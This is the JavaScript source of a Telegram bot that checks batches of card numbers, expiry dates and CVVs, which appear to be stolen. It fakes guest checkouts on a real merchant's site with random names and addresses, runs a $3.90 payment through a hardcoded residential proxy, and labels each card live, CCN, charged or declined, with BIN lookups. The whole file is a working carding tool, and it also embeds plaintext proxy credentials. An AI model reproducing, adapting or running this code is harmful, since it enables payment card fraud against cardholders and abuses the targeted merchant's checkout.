const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const axios = require('axios');
const { wrapper } = require('axios-cookiejar-support');
const { CookieJar } = require('tough-cookie');

const token = process.env.TELEGRAM_BOT_TOKEN;
const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL || `https://telbot-lvvm.onrender.com`;

const bot = new TelegramBot(token);
bot.setWebHook(`${RENDER_EXTERNAL_URL}/bot${token}`);

app.post(`/bot${token}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

const proxyConfig = {
    host: 'us-east.gw.rayobyte.com',
    port: 8000,
    auth: {
        username: 'tumaob1us_gmail_com-isp',
        password: 'Ntj9hnVhDb2B6vL4'
    }
};

const firstNames = ['Shawn', 'James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard', 'Joseph', 'Thomas'];
const lastNames = ['PHKHKKFG', 'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis', 'Garcia', 'Wilson'];
const addresses = [
    { addr: '13822 NE Airport Way', city: 'Portland', state: 'OR', zip: '97251-9614' },
    { addr: '1234 Market St', city: 'San Francisco', state: 'CA', zip: '94103' },
    { addr: '456 Ocean Drive', city: 'Miami', state: 'FL', zip: '33139' },
    { addr: '789 Broadway', city: 'New York', state: 'NY', zip: '10003' },
    { addr: '321 Michigan Ave', city: 'Chicago', state: 'IL', zip: '60611' }
];

const randomEmails = ['jhefvrix', 'shawnph', 'testuser', 'fireflybuyer', 'user99x'];
const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

async function getBinDetails(cc) {
    const binClean = cc.replace(/\s+/g, '').substring(0, 6);
    let binData = { brand: 'N/A', type: 'N/A', category: 'N/A', bank: 'N/A', country: 'N/A', emoji: '🌐' };

    try {
        const res = await axios.get(`https://lookup.binlist.net/${binClean}`, {
            headers: { 'Accept-Version': '3' },
            timeout: 3000
        });
        if (res.data) {
            binData.brand = res.data.scheme ? String(res.data.scheme).toUpperCase() : 'N/A';
            binData.type = res.data.type ? String(res.data.type).toUpperCase() : 'N/A';
            binData.category = res.data.brand ? String(res.data.brand).toUpperCase() : 'N/A';
            binData.bank = res.data.bank && res.data.bank.name ? String(res.data.bank.name).toUpperCase() : 'N/A';
            binData.country = res.data.country && res.data.country.name ? String(res.data.country.name).toUpperCase() : 'N/A';
            binData.emoji = res.data.country && res.data.country.emoji ? String(res.data.country.emoji) : '🌐';
            return binData;
        }
    } catch (e) {
        try {
            const res2 = await axios.get(`https://data.handyapi.com/bin/${binClean}`, { timeout: 3000 });
            if (res2.data && res2.data.Scheme) {
                binData.brand = String(res2.data.Scheme || 'N/A').toUpperCase();
                binData.type = String(res2.data.Type || 'N/A').toUpperCase();
                binData.category = String(res2.data.CardClass || 'N/A').toUpperCase();
                binData.bank = String(res2.data.Issuer || 'N/A').toUpperCase();
                binData.country = String(res2.data.Country || 'N/A').toUpperCase();
                return binData;
            }
        } catch (err2) {}
    }

    binData.brand = cc.startsWith('4') ? 'VISA' : cc.startsWith('5') ? 'MASTERCARD' : cc.startsWith('3') ? 'AMEX' : 'UNKNOWN';
    return binData;
}

async function processCard(lista) {
    const startTime = Date.now();
    const parts = lista.split(/[:|]/);
    const cc = parts[0] || '';
    let mes = parts[1] || '';
    let ano = parts[2] || '';
    const cvv1 = parts[3] || '';

    if (ano.length === 4) {
        ano = ano.slice(2);
    }

    const binData = await getBinDetails(cc);

    try {
        const jar = new CookieJar();
        const client = wrapper(axios.create({
            jar,
            proxy: proxyConfig,
            timeout: 20000,
            validateStatus: () => true
        }));

        const dynamicSess = 'btrhdet07gjosk34' + Math.random().toString(36).substring(2, 7);
        const rfname = firstNames[Math.floor(Math.random() * firstNames.length)];
        const rlname = lastNames[Math.floor(Math.random() * lastNames.length)];
        const raddrInfo = addresses[Math.floor(Math.random() * addresses.length)];
        const remail = randomEmails[Math.floor(Math.random() * randomEmails.length)] + Math.floor(Math.random() * 900 + 100) + '@gmail.com';
        const rphone = '971' + Math.floor(Math.random() * 900 + 100) + Math.floor(Math.random() * 9000 + 1000);

        await client.post('https://fireflyfuel.com/cart/add-item.ajax/id/325', 'skuId=925&quantity=1', {
            headers: {
                'authority': 'fireflyfuel.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': `PHPSESSID=${dynamicSess}`,
                'origin': 'https://fireflyfuel.com',
                'referer': 'https://fireflyfuel.com/shop/dropper',
                'user-agent': ua
            }
        });

        await client.get('https://fireflyfuel.com/checkout', {
            headers: {
                'authority': 'fireflyfuel.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'cookie': `PHPSESSID=${dynamicSess}`,
                'referer': 'https://fireflyfuel.com/shop/dropper',
                'user-agent': ua
            }
        });

        await client.post('https://fireflyfuel.com/checkout', `type=guest&guestEmail=${encodeURIComponent(remail)}&offers=1`, {
            headers: {
                'authority': 'fireflyfuel.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': `PHPSESSID=${dynamicSess}`,
                'origin': 'https://fireflyfuel.com',
                'referer': 'https://fireflyfuel.com/checkout',
                'user-agent': ua
            }
        });

        const infoData = `shipping%5Bcountry%5D=US&shipping%5BUS%5D%5BfirstName%5D=${encodeURIComponent(rfname)}&shipping\%5BUS\%5D\%5BlastName\%5D=${encodeURIComponent(rlname)}&shipping%5BUS%5D%5Bcompany%5D=&shipping%5BUS%5D%5Bphone%5D=${rphone}&shipping\%5BUS\%5D\%5Baddress1\%5D=${encodeURIComponent(raddrInfo.addr)}&shipping%5BUS%5D%5Baddress2%5D=&shipping%5BUS%5D%5Bcity%5D=${encodeURIComponent(raddrInfo.city)}&shipping\%5BUS\%5D\%5Bstate\%5D=${raddrInfo.state}&shipping%5BUS%5D%5Bzipcode%5D=${raddrInfo.zip}&shipping\%5BCA\%5D\%5BfirstName\%5D=&shipping\%5BCA\%5D\%5BlastName\%5D=&shipping\%5BCA\%5D\%5Bcompany\%5D=&shipping\%5BCA\%5D\%5Bphone\%5D=&shipping\%5BCA\%5D\%5Baddress1\%5D=&shipping\%5BCA\%5D\%5Baddress2\%5D=&shipping\%5BCA\%5D\%5Bcity\%5D=&shipping\%5BCA\%5D\%5Bstate\%5D=ON&shipping\%5BCA\%5D\%5Bzipcode\%5D=&shipping\%5BGU\%5D\%5BfirstName\%5D=&shipping\%5BGU\%5D\%5BlastName\%5D=&shipping\%5BGU\%5D\%5Bcompany\%5D=&shipping\%5BGU\%5D\%5Bphone\%5D=&shipping\%5BGU\%5D\%5Baddress1\%5D=&shipping\%5BGU\%5D\%5Baddress2\%5D=&shipping\%5BGU\%5D\%5Bcity\%5D=&shipping\%5BGU\%5D\%5Bstate\%5D=GU&shipping\%5BGU\%5D\%5Bzipcode\%5D=&shipping\%5BPR\%5D\%5BfirstName\%5D=&shipping\%5BPR\%5D\%5BlastName\%5D=&shipping\%5BPR\%5D\%5Bcompany\%5D=&shipping\%5BPR\%5D\%5Bphone\%5D=&shipping\%5BPR\%5D\%5Baddress1\%5D=&shipping\%5BPR\%5D\%5Baddress2\%5D=&shipping\%5BPR\%5D\%5Bcity\%5D=&shipping\%5BPR\%5D\%5Bstate\%5D=PR&shipping\%5BPR\%5D\%5Bzipcode\%5D=&shipping\%5BMX\%5D\%5BfirstName\%5D=&shipping\%5BMX\%5D\%5BlastName\%5D=&shipping\%5BMX\%5D\%5Bcompany\%5D=&shipping\%5BMX\%5D\%5Bphone\%5D=&shipping\%5BMX\%5D\%5Baddress1\%5D=&shipping\%5BMX\%5D\%5Baddress2\%5D=&shipping\%5BMX\%5D\%5Bcity\%5D=&shipping\%5BMX\%5D\%5Bstate\%5D=AG&shipping\%5BMX\%5D\%5Bzipcode\%5D=&shipping\%5BAU\%5D\%5BfirstName\%5D=&shipping\%5BAU\%5D\%5BlastName\%5D=&shipping\%5BAU\%5D\%5Bcompany\%5D=&shipping\%5BAU\%5D\%5Bphone\%5D=&shipping\%5BAU\%5D\%5Baddress1\%5D=&shipping\%5BAU\%5D\%5Baddress2\%5D=&shipping\%5BAU\%5D\%5Bcity\%5D=&shipping\%5BAU\%5D\%5Bstate\%5D=&shipping\%5BAU\%5D\%5Bzipcode\%5D=&shipping\%5BNZ\%5D\%5BfirstName\%5D=&shipping\%5BNZ\%5D\%5BlastName\%5D=&shipping\%5BNZ\%5D\%5Bcompany\%5D=&shipping\%5BNZ\%5D\%5Bphone\%5D=&shipping\%5BNZ\%5D\%5Baddress1\%5D=&shipping\%5BNZ\%5D\%5Baddress2\%5D=&shipping\%5BNZ\%5D\%5Bcity\%5D=&shipping\%5BNZ\%5D\%5Bzipcode\%5D=&shipping\%5BPH\%5D\%5BfirstName\%5D=&shipping\%5BPH\%5D\%5BlastName\%5D=&shipping\%5BPH\%5D\%5Bcompany\%5D=&shipping\%5BPH\%5D\%5Bphone\%5D=&shipping\%5BPH\%5D\%5Baddress1\%5D=&shipping\%5BPH\%5D\%5Baddress2\%5D=&shipping\%5BPH\%5D\%5Bcity\%5D=&shipping\%5BPH\%5D\%5Bzipcode\%5D=&shipping\%5BPH\%5D\%5Bstate\%5D=&shipping\%5BHK\%5D\%5BfirstName\%5D=&shipping\%5BHK\%5D\%5BlastName\%5D=&shipping\%5BHK\%5D\%5Bcompany\%5D=&shipping\%5BHK\%5D\%5Bphone\%5D=&shipping\%5BHK\%5D\%5Baddress2\%5D=&shipping\%5BHK\%5D\%5Baddress1\%5D=&shipping\%5BHK\%5D\%5Bcity\%5D=&billing\%5BsameAsShipping\%5D=1&billing\%5Bcountry\%5D=US&billing\%5BUS\%5D\%5BfirstName\%5D=&billing\%5BUS\%5D\%5BlastName\%5D=&billing\%5BUS\%5D\%5Bcompany\%5D=&billing\%5BUS\%5D\%5Bphone\%5D=&billing\%5BUS\%5D\%5Baddress1\%5D=&billing\%5BUS\%5D\%5Baddress2\%5D=&billing\%5BUS\%5D\%5Bcity\%5D=&billing\%5BUS\%5D\%5Bstate\%5D=${raddrInfo.state}&billing%5BUS%5D%5Bzipcode%5D=&billing%5BCA%5D%5BfirstName%5D=&billing%5BCA%5D%5BlastName%5D=&billing%5BCA%5D%5Bcompany%5D=&billing%5BCA%5D%5Bphone%5D=&billing%5BCA%5D%5Baddress1%5D=&billing%5BCA%5D%5Baddress2%5D=&billing%5BCA%5D%5Bcity%5D=&billing%5BCA%5D%5Bstate%5D=ON&billing%5BCA%5D%5Bzipcode%5D=&billing%5BGU%5D%5BfirstName%5D=&billing%5BGU%5D%5BlastName%5D=&billing%5BGU%5D%5Bcompany%5D=&billing%5BGU%5D%5Bphone%5D=&billing%5BGU%5D%5Baddress1%5D=&billing%5BGU%5D%5Baddress2%5D=&billing%5BGU%5D%5Bcity%5D=&billing%5BGU%5D%5Bstate%5D=GU&billing%5BGU%5D%5Bzipcode%5D=&billing%5BPR%5D%5BfirstName%5D=&billing%5BPR%5D%5BlastName%5D=&billing%5BPR%5D%5Bcompany%5D=&billing%5BPR%5D%5Bphone%5D=&billing%5BPR%5D%5Baddress1%5D=&billing%5BPR%5D%5Baddress2%5D=&billing%5BPR%5D%5Bcity%5D=&billing%5BPR%5D%5Bstate%5D=PR&billing%5BPR%5D%5Bzipcode%5D=&billing%5BMX%5D%5BfirstName%5D=&billing%5BMX%5D%5BlastName%5D=&billing%5BMX%5D%5Bcompany%5D=&billing%5BMX%5D%5Bphone%5D=&billing%5BMX%5D%5Baddress1%5D=&billing%5BMX%5D%5Baddress2%5D=&billing%5BMX%5D%5Bcity%5D=&billing%5BMX%5D%5Bstate%5D=AG&billing%5BMX%5D%5Bzipcode%5D=&billing%5BAU%5D%5BfirstName%5D=&billing%5BAU%5D%5BlastName%5D=&billing%5BAU%5D%5Bcompany%5D=&billing%5BAU%5D%5Bphone%5D=&billing%5BAU%5D%5Baddress1%5D=&billing%5BAU%5D%5Baddress2%5D=&billing%5BAU%5D%5Bcity%5D=&billing%5BAU%5D%5Bstate%5D=&billing%5BAU%5D%5Bzipcode%5D=&billing%5BNZ%5D%5BfirstName%5D=&billing%5BNZ%5D%5BlastName%5D=&billing%5BNZ%5D%5Bcompany%5D=&billing%5BNZ%5D%5Bphone%5D=&billing%5BNZ%5D%5Baddress1%5D=&billing%5BNZ%5D%5Baddress2%5D=&billing%5BNZ%5D%5Bcity%5D=&billing%5BNZ%5D%5Bzipcode%5D=&billing%5BPH%5D%5BfirstName%5D=&billing%5BPH%5D%5BlastName%5D=&billing%5BPH%5D%5Bcompany%5D=&billing%5BPH%5D%5Bphone%5D=&billing%5BPH%5D%5Baddress1%5D=&billing%5BPH%5D%5Baddress2%5D=&billing%5BPH%5D%5Bcity%5D=&billing%5BPH%5D%5Bzipcode%5D=&billing%5BPH%5D%5Bstate%5D=&billing%5BHK%5D%5BfirstName%5D=&billing%5BHK%5D%5BlastName%5D=&billing%5BHK%5D%5Bcompany%5D=&billing%5BHK%5D%5Bphone%5D=&billing%5BHK%5D%5Baddress2%5D=&billing%5BHK%5D%5Baddress1%5D=&billing%5BHK%5D%5Bcity%5D=`;

        await client.post('https://fireflyfuel.com/checkout/info', infoData, {
            headers: {
                'authority': 'fireflyfuel.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'cookie': `PHPSESSID=${dynamicSess}`,
                'accept-language': 'en-GB,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://fireflyfuel.com',
                'referer': 'https://fireflyfuel.com/checkout',
                'user-agent': ua
            }
        });

        await client.get('https://fireflyfuel.com/checkout/payment', {
            headers: {
                'authority': 'fireflyfuel.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'cookie': `PHPSESSID=${dynamicSess}`,
                'referer': 'https://fireflyfuel.com/checkout/info',
                'user-agent': ua
            }
        });

        const paymentData = `x_amount=3.90&x_order_id=&x_cust_id=&x_first_name=${encodeURIComponent(rfname)}&x_last_name=${encodeURIComponent(rlname)}&x_address=${encodeURIComponent(raddrInfo.addr)}&x_city=${encodeURIComponent(raddrInfo.city)}&x_state=${raddrInfo.state}&x_zip=${raddrInfo.zip}&x_phone=${rphone}&x_email=${encodeURIComponent(remail)}&x_country=US&x_ship_to_first_name=${encodeURIComponent(rfname)}&x_ship_to_last_name=${encodeURIComponent(rlname)}&x_ship_to_address=${encodeURIComponent(raddrInfo.addr)}&x_ship_to_city=${encodeURIComponent(raddrInfo.city)}&x_ship_to_state=${raddrInfo.state}&x_ship_to_zip=${raddrInfo.zip}&x_ship_to_phone=${rphone}&x_ship_to_country=US&x_card_num=${cc}&x_exp_date=${mes}${ano}&x_card_code=${cvv1}`;

        const payRes = await client.post('https://fireflyfuel.com/checkout/run-payment.ajax', paymentData, {
            headers: {
                'authority': 'fireflyfuel.com',
                'accept': '*/*',
                'cookie': `PHPSESSID=${dynamicSess}`,
                'accept-language': 'en-GB,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://fireflyfuel.com',
                'referer': 'https://fireflyfuel.com/checkout/payment',
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua
            }
        });

        const ro2 = payRes.data;
        const result = ro2 && ro2.result ? ro2.result : '';
        let message = ro2 && ro2.messages ? ro2.messages.replace(/<[^>]*>?/gm, '').trim() : (ro2 && ro2.message ? ro2.message : JSON.stringify(ro2));
        const od = ro2 && ro2.order_id ? ro2.order_id : '';

        const overallTime = ((Date.now() - startTime) / 1000).toFixed(2);

        let chargeType = 'DECLINED';
        let statusIcon = '❌';
        if (message.toLowerCase().includes('address provided does not match') || message.toLowerCase().includes('avs mismatch')) {
            chargeType = 'CVV (Live / AVS Mismatch)';
            statusIcon = '✅';
            message = 'Live Card (AVS Mismatch)';
        } else if (message.toLowerCase().includes('invalid cvv') || message.toLowerCase().includes('insufficient funds')) {
            chargeType = 'CCN';
            statusIcon = '⚠️';
        } else if (result === 'success') {
            chargeType = 'CVV CHARGED $3.90';
            statusIcon = '🔥';
        }

        let responseText = `┏• CC: \`${lista}\`\n`;
        responseText += `┣• ${statusIcon}${message}\n`;
        responseText += `┣• Charge Type: ${chargeType}\n`;
        responseText += `┣• Gateway: AVS Checker\n`;
        responseText += `┗• Execution Time: ${overallTime} seconds\n\n`;
        
        responseText += `┏• BIN DATA\n`;
        responseText += `┣• Bin: \`${cc.substring(0, 6)}\`\n`;
        responseText += `┣• Brand Code: ${binData.brand}\n`;
        responseText += `┣• Category: ${binData.category}\n`;
        responseText += `┣• Card Type: ${binData.type}\n`;
        responseText += `┣• Issuing Bank: ${binData.bank}\n`;
        responseText += `┗• Country: ${binData.emoji} -${binData.country}`;

        return responseText;
    } catch (error) {
        return `┏• CC: \`${lista}\`\n┗• ❌ Error: ${error.message}`;
    }
}

bot.onText(/\/(?:avs|g) ([\s\S]+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const inputContent = match[1].trim();

    const lines = inputContent.split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0);
    const cards = lines.slice(0, 10);

    if (cards.length === 0) {
        return bot.sendMessage(chatId, `⚠️ Please provide at least one card!`, { parse_mode: 'Markdown' });
    }

    bot.sendMessage(chatId, `🚀 **Checking ${cards.length} card(s)... Please wait.**`, { parse_mode: 'Markdown' });

    for (let i = 0; i < cards.length; i += 2) {
        const batch = cards.slice(i, i + 2);
        const promises = batch.map(card => processCard(card));
        const results = await Promise.all(promises);

        for (const resultMsg of results) {
            await bot.sendMessage(chatId, resultMsg, { parse_mode: 'Markdown' });
        }
    }
});

bot.on('document', async (msg) => {
    const chatId = msg.chat.id;
    const document = msg.document;

    if (document.mime_type === 'text/plain' || document.file_name.endsWith('.txt')) {
        try {
            bot.sendMessage(chatId, `📥 **Downloading and processing file...**`, { parse_mode: 'Markdown' });
            
            const fileLink = await bot.getFileLink(document.file_id);
            const fileRes = await axios.get(fileLink);
            const fileContent = fileRes.data;

            const lines = fileContent.split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0);
            const cards = lines.slice(0, 10);

            if (cards.length === 0) {
                return bot.sendMessage(chatId, `⚠️ The uploaded file is empty or invalid format!`, { parse_mode: 'Markdown' });
            }

            bot.sendMessage(chatId, `🚀 **Found ${cards.length} card(s) in file. Processing...**`, { parse_mode: 'Markdown' });

            for (let i = 0; i < cards.length; i += 2) {
                const batch = cards.slice(i, i + 2);
                const promises = batch.map(card => processCard(card));
                const results = await Promise.all(promises);

                for (const resultMsg of results) {
                    await bot.sendMessage(chatId, resultMsg, { parse_mode: 'Markdown' });
                }
            }
        } catch (err) {
            bot.sendMessage(chatId, `❌ **Error processing file:** \`${err.message}\``, { parse_mode: 'Markdown' });
        }
    }
});

app.get('/', (req, res) => {
    res.send('AVS Telegram Bot Webhook is running successfully!');
});

app.listen(PORT, () => {
    console.log(`Webhook server is running on port ${PORT}`);
});
